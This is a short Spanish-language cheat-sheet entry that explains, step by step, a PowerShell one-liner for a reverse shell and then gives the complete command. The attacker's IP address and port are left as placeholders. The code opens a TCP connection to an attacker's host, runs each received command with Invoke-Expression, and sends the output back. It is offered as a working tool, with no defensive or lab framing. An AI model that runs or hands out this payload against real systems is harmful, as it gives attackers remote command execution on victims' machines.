one-liner de PowerShell para establecer una reverse shell:

    powershell -c ": Esto indica que se está ejecutando PowerShell y que se proporcionará un comando a través de la opción -c, que permite ejecutar un comando como argumento de la línea de comandos de PowerShell.

    "$client = New-Object System.Net.Sockets.TcpClient('tu_ip', tu_puerto);": Esta parte del código crea un objeto TcpClient de .NET para establecer una conexión TCP con la dirección IP y el puerto especificados del atacante. Reemplaza 'tu_ip' y 'tu_puerto' con la dirección IP y el puerto del atacante.

    "$stream = $client.GetStream();": Se obtiene el flujo de datos asociado con el cliente TCP recién creado.

    "[byte[]]$bytes = 0..65535|%{0};": Se inicializa un arreglo de bytes vacío con una longitud máxima de 65536 bytes. Esto se usará para almacenar los datos recibidos de la conexión.

    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;: Se inicia un bucle while que continúa leyendo datos del flujo hasta que no hay más datos disponibles.

    ;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);: Se convierten los bytes leídos en una cadena ASCII.

    ;$sendback = (iex $data 2>&1 | Out-String );: Se ejecuta el comando recibido ($data) utilizando iex, que es un alias para el cmdlet Invoke-Expression. Esto ejecuta el comando y captura su salida. El 2>&1 redirige los errores a la salida estándar. Out-String convierte la salida en una cadena para su posterior envío.

    ;$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';: Se crea una cadena que contiene la salida del comando ejecutado y la ruta del directorio actual de PowerShell, para simular un indicador de comando (PS).

    ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);: Se convierte la cadena $sendback2 en una secuencia de bytes utilizando codificación ASCII.

    ;$stream.Write($sendbyte,0,$sendbyte.Length);: Se envían los bytes al flujo de datos para que sean transmitidos al atacante.

    ;$stream.Flush()};: Se vacía el búfer de salida para asegurarse de que todos los datos se envíen al atacante.

    $client.Close()": Se cierra la conexión TCP con el atacante una vez que el bucle while ha terminado de ejecutarse.

```

powershell -c "$client = New-Object System.Net.Sockets.TcpClient('tu_ip', tu_puerto);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

```
